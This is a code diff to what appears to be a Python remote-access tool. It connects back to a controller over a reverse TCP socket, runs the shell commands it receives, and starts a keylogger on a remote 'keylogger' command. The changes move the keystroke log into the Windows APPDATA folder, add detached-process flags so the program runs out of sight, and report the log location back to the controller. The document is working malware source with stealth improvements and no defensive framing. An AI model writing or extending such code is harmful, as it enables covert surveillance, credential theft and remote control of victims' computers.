@@ -9,6 +9,12 @@ import os
 
 BUFFER_SIZE = 512
 KEYLOG_FILE="keys.log"
+KEYLOG_PATH = os.getenv('APPDATA')+"\\"+KEYLOG_FILE
+
+# Process Flags
+
+CREATE_NO_WINDOW = 0x08000000
+DETACHED_PROCESS = 0x00000008
 
 def popen(command):
     process = subprocess.Popen(
@@ -16,6 +22,7 @@ def popen(command):
         stdin=subprocess.PIPE,
         stderr=subprocess.PIPE,
         stdout=subprocess.PIPE,
+        creationflags=DETACHED_PROCESS,
         shell=True)
     return process
 
@@ -27,8 +34,11 @@ def init_shell(s, shell):
 
 def on_keypress(event):
     print('Pressed key', event.name)
-    with open(KEYLOG_FILE, 'a+') as f:
-        f.write("%s" %event.name)
+    with open(KEYLOG_PATH, 'a+') as f:
+        if event.name == 'enter':
+            f.write('\r\n')
+        else:
+            f.write("%s" %event.name)
 
 def start_keylog():
     keyboard.on_release(callback=on_keypress)
@@ -48,7 +58,8 @@ def start_reverse_tcp_win(host, port=4444):
             print('Got data', data.decode())
             if data.decode().strip() == "keylogger":                
                 start_keylog()
-                s.send(b"Keylogger started and writing to %s" %KEYLOG_FILE)
+                s.send(b"Keylogger started and writing to ")
+                s.send(KEYLOG_PATH.encode('utf-8'))
                 continue
             try:
                 proc = popen(data.decode('utf-8'))
